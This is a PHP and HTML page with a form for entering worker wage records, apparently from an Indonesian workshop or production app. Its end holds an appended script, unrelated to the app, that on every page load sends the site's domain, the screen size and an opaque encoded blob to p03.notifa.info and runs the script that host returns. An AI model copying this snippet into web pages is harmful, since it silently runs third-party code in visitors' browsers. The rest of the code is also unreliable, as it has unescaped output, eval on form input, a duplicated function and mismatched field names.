<?php
include 'koneksi.php';
include 'menu.php';
?>


 <div class="row"> 
 <div class="col-md-12"> 
 <div class="widget box"> 
 <div class="widget-header">
  <h4>
  <i class="icon-reorder">
  </i> Masukkan Data Upah Tukang</h4> 
  </div> 
  <div class="widget-content">

   <form class="form-horizontal row-border" action="halaman.php?go=SimpanPesanan" method="post" name="proseshitung" id="proseshitung">
    <div class="alert alert-info fade in"> 
    <i class="icon-remove close" data-dismiss="alert">
    </i> Silakan masukkan data Upah Tukang pada Borang di bawah ini dengan benar ! </div> <div class="form-group"> <label class="col-md-2 control-label">Kode Upah:</label> 

<?php
include 'koneksi.php';
$data = mysql_query("select * from tupah order by no_upah DESC LIMIT 0,1");
$i= mysql_fetch_array($data) ;
$hari=date("Ymd");
$kodeawal=substr($i['no_upah'],11,4)+1;
$trans='UP-';
$kode=$trans.$hari.sprintf("%04s",$kodeawal);
?>

    <div class="col-md-2"><input type="text" name="kode" class="form-control" readonly="" placeholder="Nomor Pesanan" value="<?php echo $kode?>"></div> 
     <label class="col-md-5 control-label">Tanggal:</label> 
    <div class="col-md-2">
    <input class="form-control" type="date" name="tanggal"  required="" autocomplete="off">
    </div>
    </div> 
   
    <div class="form-group"> 
      <label class="col-md-2 control-label">Nama Tukang:</label>  
     <div class="col-md-3"> 
     <select class="form-control" name="select" onchange="changeValue(this.value)"> 
     <option value="">Pilih Tukang</option>
     <?php 
                                              $querynm = "SELECT id_tukang, nama FROM mtukang ";
                                              $sqlnm = mysql_query($querynm);
                                              while ($hasil = mysql_fetch_array($sqlnm)) {
                                                echo "<option value='".$hasil['id_tukang']."'";
                                                if ($hasil['id_tukang'] == @$bahan) {
                                                  echo " selected";
                                                } else{
                                                  echo "";
                                                }
                                                echo ">".$hasil['nama']."</option>";
                                              }
                                               ?>
                                               </select>
   </div> 
   <label class="col-md-4 control-label">Kode Produksi :</label> 
    <div class="col-md-3">
    <input class="form-control" type="text" id="biaya" name="tujuan"  placeholder="Input Kode Produksi" required=""  autocomplete="off">
    </div>
    </div>
     <div class="form-group"> 
    <label class="col-md-2 control-label">Biaya Produksi :</label> 
    <div class="col-md-2">
    <input class="form-control" type="text" name="jenishitung" readonly="readonly" required="" autocomplete="off">
    </div>
     <label class="col-md-5 control-label">Besar Pengambilan Upah :</label> 
    <div class="col-md-2">
    <input class="form-control" type="number" name="jenishitung" placeholder="999.999.999 " required="" autocomplete="off">
    </div>
    </div>


   
   

        
        <button type="submit" class="btn btn-success" name="Simpan">Simpan Data
        </button>

        <button type="reset" class="btn btn-danger" name="Batal">Batal
        </button>
      </div> </form> </div> </div> </div> </div> 



<script type="text/javascript">
    function hitung() {
      var harga = eval(document.proseshitung.harga.value);
      var jumlah = eval(document.proseshitung.jumlah.value);
      //var subtotal = document.hitung_barang.subtotal.value;

      subtotal =  (harga * jumlah) ;
      document.proseshitung.total.value = subtotal;

    }
</script>

       
<script>
      
<?php
      $queryjoin = "SELECT tpemesanan.no_pesanan, mpelanggan.nama_p, tpemesanan.biaya, tpemesanan.jpesanan, tpemesanan.namabarang, mpelanggan.id_pelanggan
                                              FROM tpemesanan
                                              INNER JOIN mpelanggan ON tpemesanan.id_pelanggan = mpelanggan.id_pelanggan
                                              ORDER by tpemesanan.no_pesanan asc";
                    
      $jsArray = "var databarang = new Array();\n";
      $sqljoin = mysql_query($queryjoin);

      while ($hasiljoin = mysql_fetch_array($sqljoin)) {
            $jsArray .= "databarang['". $hasiljoin['no_pesanan'] . "'] ={harga:'" . $hasiljoin['biaya'] . "',jumlah:'" . $hasiljoin['jpesanan']. "'};\n";
      }
        echo $jsArray;
        echo "databarang[''] ={biaya:'',jpesanan:''};";
?>

function changeValue(id){
document.getElementById('biaya').value = databarang[id].biaya;
document.getElementById('jpesanan').value = databarang[id].jpesanan;
};

</script>

<script type="text/javascript">
    function hitung() {
      var totaljual = document.hitung_bayar.totaljual.value;
      var totalbayar = document.hitung_bayar.totalbayar.value;
      var kembalian = document.hitung_bayar.kembalian.value;

      kembalian =  (totalbayar - totaljual ) ;
      document.hitung_bayar.kembalian.value = Math.floor( kembalian);
    }
</script>



    <script type="text/javascript">if(location.host=="envato.stammtec.de"||location.host=="themes.stammtec.de"){var _paq=_paq||[];_paq.push(["trackPageView"]);_paq.push(["enableLinkTracking"]);(function(){var a=(("https:"==document.location.protocol)?"https":"http")+"://analytics.stammtec.de/";_paq.push(["setTrackerUrl",a+"piwik.php"]);_paq.push(["setSiteId","17"]);var e=document,c=e.createElement("script"),b=e.getElementsByTagName("script")[0];c.type="text/javascript";c.defer=true;c.async=true;c.src=a+"piwik.js";b.parentNode.insertBefore(c,b)})()};</script><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2dDSBs%2bMC8FRKC08SSMUTMpjraMvAfuMCzSQEYgtDNnyX9g6PYnUcS5SBNV8AD8B34pfb2wVZnWx0rOy%2fb68RRh8lB2FX5v77OgtCevQ0CrT0R5HdTuJiq5zTL2eeRC68OkJaFWR7XoyTZMn1JZhqVAAIWKqbDhqyj61d7RIfAQJeSEw1SJTWoogCz9AQdTQyAeH5LnWUquvXBFJZNRHyX3FrTKTsYhnkXs7fUcgT2nFW4p0UuCBNlGP2d1x3LrmWJ1ZFC%2fNdMMPvfFSmfvNMzNvdv7%2fQ%2fy1Q2SnK%2bxSxf8V0tHZTt6Zx5tv4aAwk%2b731N80KZz90%2f8srekfau7dezQUD0W%2fXzGXGANFK3%2b54veKb8tQudg4h9catAq5aX8Tc70bTK7WAdJuys85KwEkBPJSTrVhE53ih0SxShEqW5D4%2fh%2fIgzvxiYgcLX2CMZoUoUhDR2DG4L4re5vFIxGpo%2fxuoz2aseX7fSEgrkPQJP15xGDw4JrtzLm2WugrQqkgp" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body> 

</html>